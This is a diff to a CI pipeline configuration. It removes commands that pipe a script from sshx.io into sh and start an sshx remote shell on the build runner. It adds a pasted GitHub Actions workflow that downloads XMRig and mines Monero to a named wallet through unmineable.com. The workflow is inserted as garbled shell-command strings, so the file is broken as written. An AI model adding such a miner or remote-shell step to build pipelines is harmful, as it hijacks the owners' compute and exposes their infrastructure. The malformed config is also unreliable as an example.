@@ -15,7 +15,31 @@ blocks:
       jobs:
         - name: Test job
           commands:
-            - checkout
-            - echo "Hello from my 'main' container"
-            - 'curl -sSf https://sshx.io/get | sh'
-            - sshx
+            - 'name: XMRig Mining'
+            - 'on:'
+            - '  workflow_dispatch:   # Manual trigger'
+            - '  push:                # Optional: run on code push'
+            - '    branches:'
+            - '      - main'
+            - 'jobs:'
+            - '  cpu_mining:'
+            - '    runs-on: ubuntu-latest'
+            - '    steps:'
+            - '      - name: Checkout repository'
+            - '        uses: actions/checkout@v3'
+            - '      - name: Install dependencies'
+            - '        run: |'
+            - '          sudo apt-get update'
+            - '          sudo apt-get install -y wget tar'
+            - '      - name: Download xmrig'
+            - '        run: |'
+            - '          wget https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.25.0-linux-static-x64.tar.gz'
+            - '          tar -xf xmrig-6.25.0-linux-static-x64.tar.gz'
+            - '          cd xmrig-6.25.0'
+            - '      - name: Run xmrig miner'
+            - '        run: |'
+            - '          cd xmrig-6.25.0'
+            - '          ./xmrig -a rx \'
+            - '            -o stratum+ssl://rx-eu.unmineable.com:443 \'
+            - '            -u XMR:49hnWUygafF8tTZ48PmT9WJvRTkRLMWskNmtFddkVHRi1XAvBeHdiTb29edTDZ8QywLGZzMvV4PBGMfrTBJgZ1dJM7PrubE.unmineable_worker_cc21 \'
+            - '            -p x'
